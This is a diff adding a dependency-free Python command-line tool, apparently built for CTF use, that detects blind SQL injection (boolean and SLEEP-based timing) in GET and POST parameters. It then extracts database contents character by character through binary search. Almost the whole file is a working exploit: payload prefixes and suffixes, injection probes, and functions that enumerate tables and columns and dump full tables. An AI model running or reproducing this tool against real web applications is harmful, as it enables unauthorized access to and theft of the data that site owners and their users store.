@@ -1,0 +1,218 @@
+#!/usr/bin/env python3
+# sqli -- SQL 注入盲注检测与数据提取（零依赖：python3 stdlib）
+# 功能: 布尔/时间盲注自动检测（引号/双引号/数字自动尝试），二分法逐字符提取任意 SQL 表达式
+# 用法: sqli <URL> [选项]
+# 例子:
+#   sqli "http://x/flag.php?id=1" --query "select group_concat(table_name) from information_schema.tables"
+#   sqli "http://x/login.php" --method POST --data "user=admin&pass={INJ}" --query "select database()"
+
+import argparse
+import hashlib
+import json
+import sys
+import time
+import urllib.parse
+import urllib.request
+
+HDR = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) sqli"}
+
+
+def http(url, method="GET", data=None, cookie=None, timeout=8):
+    req = urllib.request.Request(url, headers=dict(HDR))
+    if cookie:
+        req.add_header("Cookie", cookie)
+    if method == "POST":
+        body = urllib.parse.urlencode(data).encode() if isinstance(data, dict) else data.encode()
+        req = urllib.request.Request(url, data=body, headers=dict(HDR), method="POST")
+        if cookie:
+            req.add_header("Cookie", cookie)
+    t0 = time.time()
+    try:
+        with urllib.request.urlopen(req, timeout=timeout) as r:
+            raw = r.read()
+            return r.status, raw, time.time() - t0
+    except urllib.error.HTTPError as e:
+        return e.code, e.read(), time.time() - t0
+    except Exception as e:
+        return 0, str(e).encode(), time.time() - t0
+
+
+def url_of(base, data, payload, marker):
+    if data:
+        return base
+    if marker in base:
+        return base.replace(marker, urllib.parse.quote(payload))
+    sep = "&" if "?" in base else "?"
+    return base + sep + urllib.parse.quote(payload)
+
+
+def send(base, method, data, cookie, payload, marker, timeout):
+    if data:
+        d = {k: (v.replace(marker, payload) if marker in v else v) for k, v in data.items()}
+        return http(base, method, d, cookie, timeout)
+    return http(url_of(base, data, payload, marker), method, None, cookie, timeout)
+
+
+class Detector:
+    def __init__(self, args):
+        self.args = args
+        self.marker = args.marker
+        self.prefixes = args.prefix or ["'", '"', ""]
+        self.suffix = args.suffix or ["-- -", "#", ""]
+        self.sleep = args.sleep
+
+    def probe(self, expr, suffix):
+        return send(self.args.url, self.args.method, self.args.data, self.args.cookie,
+                    self.marker_expr(expr, suffix), self.marker, self.args.timeout)
+
+    def marker_expr(self, expr, suffix):
+        return expr + suffix
+
+    def injectable(self, prefix, suffix):
+        """布尔: 1=1 vs 1=2 响应体不同; 时间: SLEEP(n) 延迟明显"""
+        if self.args.mode in ("auto", "bool"):
+            true_p = prefix + "AND 1=1" + suffix
+            false_p = prefix + "AND 1=2" + suffix
+            s1, b1, _ = self.probe(true_p, "")
+            s2, b2, _ = self.probe(false_p, "")
+            kw = self.args.true_word
+            if kw:
+                if kw.lower() in b1.decode("utf-8", "replace").lower() and kw.lower() not in b2.decode("utf-8", "replace").lower():
+                    return "bool"
+            elif b1 != b2:
+                return "bool"
+        if self.args.mode in ("auto", "time"):
+            t1 = self.probe(prefix + f"AND SLEEP({self.sleep})" + suffix, "")
+            t2 = self.probe(prefix + "AND SLEEP(0)" + suffix, "")
+            if t1[2] - t2[2] >= self.sleep * 0.8:
+                return "time"
+        return None
+
+    def detect(self):
+        for p in self.prefixes:
+            for s in self.suffix:
+                kind = self.injectable(p, s)
+                if kind:
+                    print(f"[+] 注入点: {kind} 盲注  prefix={p!r} suffix={s!r}")
+                    return kind, p, s
+        return None, None, None
+
+
+class Extractor:
+    def __init__(self, args, kind, prefix, suffix):
+        self.args = args
+        self.kind = kind
+        self.prefix = prefix
+        self.suffix = suffix
+        self.marker = args.marker
+
+    def truthy(self, cond):
+        """返回该 SQL 条件是否为真"""
+        expr = self.prefix + "AND " + cond + self.suffix
+        if self.kind == "bool":
+            s, b, _ = self.probe(expr)
+            kw = self.args.true_word
+            body = b.decode("utf-8", "replace")
+            if kw:
+                return kw.lower() in body.lower()
+            s2, b2, _ = self.probe(self.prefix + "AND 1=1" + self.suffix)
+            return b == b2
+        else:
+            s1, _, t1 = self.probe(self.prefix + f"AND IF({cond},SLEEP({self.args.sleep}),0)" + self.suffix)
+            s2, _, t2 = self.probe(self.prefix + f"AND IF(NOT({cond}),SLEEP({self.args.sleep}),0)" + self.suffix)
+            return t1 > t2
+
+    def probe(self, expr):
+        return send(self.args.url, self.args.method, self.args.data, self.args.cookie,
+                    expr, self.marker, self.args.timeout)
+
+    def extract(self, expr):
+        """二分提取任意 SQL 表达式, 返回字符串"""
+        out = []
+        pos = 1
+        while True:
+            lo, hi = 0, 255
+            found = False
+            while lo < hi:
+                mid = (lo + hi) // 2
+                cond = f"ASCII(SUBSTR(({expr}),{pos},1))>{mid}"
+                if self.truthy(cond):
+                    lo = mid + 1
+                else:
+                    hi = mid
+            ch = lo
+            if ch == 0:
+                break
+            out.append(chr(ch))
+            sys.stdout.write(chr(ch))
+            sys.stdout.flush()
+            pos += 1
+            if pos > self.args.maxlen:
+                break
+        print()
+        return "".join(out)
+
+    def tables(self):
+        q = ("select group_concat(table_name) from information_schema.tables "
+             "where table_schema=database()")
+        return self.extract(q)
+
+    def columns(self, table):
+        q = (f"select group_concat(column_name) from information_schema.columns "
+             f"where table_name='{table}'")
+        return self.extract(q)
+
+    def dump(self, table, cols):
+        parts = []
+        for c in cols.split(","):
+            parts.append(f"coalesce(cast({c.strip()} as char),0x20)")
+        q = f"select group_concat({','.join(parts)}) from {table}"
+        return self.extract(q)
+
+
+def main():
+    ap = argparse.ArgumentParser(prog="sqli", description="SQL 注入盲注检测与数据提取（零依赖）")
+    ap.add_argument("url", help="目标 URL; GET 注入点用 {INJ} 标记或直接拼在 URL 尾")
+    ap.add_argument("--method", default="GET", choices=["GET", "POST"])
+    ap.add_argument("--data", default="", help="POST 数据, 注入点用 {INJ} 标记, 如 a=1&b={INJ}")
+    ap.add_argument("--cookie", default="")
+    ap.add_argument("--marker", default="{INJ}")
+    ap.add_argument("--prefix", action="append", help="注入前缀, 可多次(默认自动尝试 ' / \" / 无)")
+    ap.add_argument("--suffix", action="append", help="注入后缀(默认 -- - / # / 空)")
+    ap.add_argument("--mode", default="auto", choices=["auto", "bool", "time"])
+    ap.add_argument("--true-word", default="", help="布尔盲注: 为真时响应中的关键字(如 success)")
+    ap.add_argument("--sleep", type=int, default=3, help="时间盲注秒数(默认3)")
+    ap.add_argument("--timeout", type=int, default=8)
+    ap.add_argument("--maxlen", type=int, default=256, help="提取最大长度(默认256)")
+    ap.add_argument("--query", default="", help="要提取的 SQL 表达式, 如 select database()")
+    ap.add_argument("--tables", action="store_true", help="提取当前库表名(逗号分隔)")
+    ap.add_argument("--columns", metavar="TABLE", help="提取指定表的列名")
+    ap.add_argument("--dump", nargs=2, metavar=("TABLE", "COLS"), help="导出表数据, COLS 逗号分隔")
+    args = ap.parse_args()
+
+    if args.data:
+        args.data = dict(kv.split("=", 1) for kv in args.data.split("&") if "=" in kv)
+
+    d = Detector(args)
+    kind, prefix, suffix = d.detect()
+    if not kind:
+        print("[-] 未检测到注入点（试试 --true-word 或 --mode time）")
+        sys.exit(1)
+
+    ex = Extractor(args, kind, prefix, suffix)
+    if args.tables:
+        print(f"[*] 表名: {ex.tables()}")
+    elif args.columns:
+        print(f"[*] {args.columns} 列: {ex.columns(args.columns)}")
+    elif args.dump:
+        t, c = args.dump
+        print(f"[*] {t} 数据: {ex.dump(t, c)}")
+    elif args.query:
+        print(f"[*] 结果: {ex.extract(args.query)}")
+    else:
+        print(f"[*] 默认提取 database(): {ex.extract('database()')}")
+        print("[*] 提示: 用 --tables / --columns T / --dump T C / --query 指定提取目标")
+
+
+if __name__ == "__main__":
+    main()
